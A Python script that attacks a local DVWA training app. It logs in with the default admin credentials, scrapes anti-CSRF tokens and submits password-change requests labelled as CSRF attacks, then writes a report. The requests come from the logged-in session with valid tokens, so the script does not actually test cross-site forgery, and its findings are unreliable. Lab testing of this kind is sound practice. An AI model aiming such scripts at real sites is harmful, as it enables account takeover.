import requests
from bs4 import BeautifulSoup

# Configuration
DVWA_URL = 'http://localhost/dvwa/'
LOGIN_URL = 'http://localhost/dvwa/login.php'
CSRF_URL = 'http://localhost/dvwa/vulnerabilities/csrf/low.php'
REPORT_FILE = 'csrf_vulnerability_report.txt'

# DVWA Credentials
USERNAME = 'admin'
PASSWORD = 'password'

# Function to login to DVWA and retrieve CSRF token
def login_to_dvwa():
    session = requests.Session()
    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.content, 'html.parser')
    
    # Extract CSRF token
    csrf_token = soup.find('input', {'name': 'user_token'})['value'] if soup.find('input', {'name': 'user_token'}) else None

    if not csrf_token:
        print('CSRF token not found in the login page HTML')
        return None

    # Login data
    login_data = {
        'username': USERNAME,
        'password': PASSWORD,
        'Login': 'Login',
        'user_token': csrf_token
    }

    # Perform login
    response = session.post(LOGIN_URL, data=login_data)
    
    if 'Login failed' in response.text:
        print('Login failed')
        return None
    
    return session

# Function to perform CSRF attack
def perform_csrf_attack(session, current_password, new_password):
    csrf_page = session.get(CSRF_URL)
    soup = BeautifulSoup(csrf_page.content, 'html.parser')
    
    # Extract CSRF token
    csrf_token = soup.find('input', {'name': 'user_token'})['value'] if soup.find('input', {'name': 'user_token'}) else None

    if not csrf_token:
        print('CSRF token not found on the CSRF page HTML')
        return False

    # CSRF attack data
    csrf_data = {
        'password_current': current_password,
        'password_new': new_password,
        'password_conf': new_password,
        'Change': 'Change',
        'user_token': csrf_token
    }

    # Perform CSRF attack
    response = session.post(CSRF_URL, data=csrf_data)
    
    # Check if the password was changed
    success = 'Password Changed' in response.text
    return success

# Function to write report
def write_report(results):
    with open(REPORT_FILE, 'w') as report_file:
        report_file.write('DVWA CSRF Vulnerability Report\n')
        report_file.write('='*40 + '\n')

        for test_case, result in results.items():
            report_file.write(f'Test Case: {test_case}\n')
            report_file.write(f'Success: {result}\n')
            report_file.write('='*40 + '\n\n')

# Main function to run the CSRF vulnerability tests
def run_csrf_vulnerability_tests():
    session = login_to_dvwa()

    if not session:
        return

    results = {}

    # CSRF attack scenarios
    test_cases = {
        'Change password with valid current password': {
            'current_password': 'password',  # current valid password
            'new_password': 'newpassword'
        },
        'Change password with invalid current password': {
            'current_password': 'wrongpassword',  # invalid current password
            'new_password': 'newpassword'
        },
        'Change password with empty current password': {
            'current_password': '',  # empty current password
            'new_password': 'newpassword'
        }
    }

    for test_case, data in test_cases.items():
        success = perform_csrf_attack(session, data['current_password'], data['new_password'])
        results[test_case] = success

    session.close()
    write_report(results)
    print(f'Report generated: {REPORT_FILE}')

# Entry point of the script
if __name__ == '__main__':
    run_csrf_vulnerability_tests()
